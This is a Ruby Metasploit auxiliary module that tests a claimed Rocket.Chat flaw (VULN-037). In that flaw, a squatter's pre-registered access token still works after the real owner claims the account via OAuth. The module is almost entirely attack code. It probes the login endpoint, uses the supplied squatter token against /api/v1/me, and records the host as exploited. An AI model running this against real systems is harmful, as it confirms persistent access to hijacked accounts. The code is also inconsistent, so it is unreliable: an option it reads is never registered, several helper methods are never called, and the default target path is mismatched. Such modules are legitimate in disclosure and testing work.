class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 squatter\'s token survives the owner\'s OAuth claim (VULN-037)',
        'Description' => %q{
          Rocket.Chat lets anyone register an address before its owner does, and when
          the owner later arrives through an OAuth provider the server melds the
          identity into that existing account. All it does about the takeover is reset
          the password, so every token the squatter minted beforehand keeps working,
          inside the account the owner now believes is theirs. This module probes the
          surviving credential: it shows that the squatter's old password is refused,
          which is the meld's own evidence that the claim happened, and that the
          personal access token the operator supplies still reads /api/v1/me as the
          claimed account. A host is vulnerable when the password is refused and the
          token still works.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/loginCode.redeem']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('SQUATTERTOKEN', [false, 'The personal access token the squatter minted before the owner\'s claim', '']),
      OptString.new('SQUATTERUSERID', [false, 'That token\'s user id', '']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    res = login_attempt
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = !login_refusal.empty? && token_still_works?
    fail_with(Failure::NotVulnerable, 'VULN-037: the attack did not land') unless hit

    print_good("#{peer} - VULN-037: exploited")
    print_good("#{peer} - the squatter's token still reads the account as "\
               "#{@token_user.inspect} after the owner's claim reset the password")
    path = store_loot('blue_spider.vuln_037', 'text/plain', rhost, res.body.to_s, 'vuln_037.txt', 'VULN-037 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-037 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # The login path, probed rather than used: these findings turn on it
  # refusing the account that the OAuth path then lets in, so its refusal is
  # evidence and not a reason to stop.
  def login_attempt(user = nil, password = nil)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(LOGIN_PATH),
      'ctype' => 'application/json',
      'data' => { 'user' => user || datastore['USERNAME'],
                  'password' => password || datastore['PASSWORD'] }.to_json
    })
  end

  def login_refusal
    res = login_attempt
    return 'no response' unless res

    reason = res.code == 200 ? '' : api_error(res).to_s
    vprint_status("#{peer} - the password path for #{datastore['USERNAME']}: " \
                  "HTTP #{res.code} #{reason}")
    reason
  end

  # The code the operator captured from their own provider's callback. A module
  # never configures a provider and never asserts an identity: it redeems what
  # the operator hands it and reports what the workspace gave back.
  def redeem_login_code
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/api/v1/loginCode.redeem'),
      'ctype' => 'application/json',
      'data' => { 'code' => datastore['LOGINCODE'] }.to_json
    })
  end

  def session_identity(res)
    doc = parse_json(res)
    token = doc['loginToken'] || doc.dig('data', 'authToken')
    uid = doc['userId'] || doc.dig('data', 'userId')
    return {} if token.to_s.empty? || uid.to_s.empty?

    me = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/me'),
      'headers' => { 'X-Auth-Token' => token, 'X-User-Id' => uid }
    })
    return {} unless me && me.code == 200

    doc = parse_json(me)
    @session_user = doc['username'].to_s
    @session_active = doc['active']
    @session_roles = doc['roles'].to_a
    vprint_status("#{peer} - the redeemed code gave a session for " \
                  "#{@session_user.inspect} (active=#{@session_active}, " \
                  "roles=#{@session_roles.join(',')})")
    doc
  end

  def oauth_service_configured?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/settings.oauth')
    })
    return false unless res

    services = (parse_json(res)['services'] || []).map { |s| s['name'] || s['service'] }
    vprint_status("#{peer} - OAuth services configured: " \
                  "#{services.compact.join(', ')}") unless services.empty?
    !services.empty?
  end

  # The token the operator supplies, presented exactly as a client would. The
  # module mints nothing: this credential already exists on the target.
  def token_still_works?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/me'),
      'headers' => { 'X-Auth-Token' => datastore['SQUATTERTOKEN'],
                     'X-User-Id' => datastore['SQUATTERUSERID'] }
    })
    return false unless res && res.code == 200

    @token_user = parse_json(res)['username'].to_s
    vprint_status("#{peer} - the supplied token reads /api/v1/me as #{@token_user.inspect}")
    !@token_user.empty?
  end
end
